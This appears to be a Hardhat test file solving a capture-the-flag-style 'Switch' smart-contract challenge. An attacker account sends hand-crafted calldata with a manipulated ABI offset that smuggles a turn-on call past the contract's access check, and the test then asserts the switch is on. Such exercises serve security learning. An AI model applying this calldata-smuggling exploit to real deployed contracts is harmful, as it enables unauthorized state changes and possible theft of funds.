const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Switch", () => {
  async function deployFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const ContractFactory = await ethers.getContractFactory("Switch")
    const contract = await ContractFactory.connect(deployer).deploy()
    await contract.waitForDeployment()
    const contractAddress = await contract.getAddress()

    // const AttackContractFactory = await ethers.getContractFactory("AttackCoinFlip")
    // const attackContract = await AttackContractFactory.connect(attacker).deploy(contractAddress)
    // await attackContract.waitForDeployment()

    return { contract, attacker }
  }

  it("attack and check", async () => {
    const { contract, attacker } = await loadFixture(deployFixture)

    await attacker.sendTransaction({
      to: await contract.getAddress(),
      data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
    })

    expect(await contract.switchOn()).to.equal(true)


  })
})

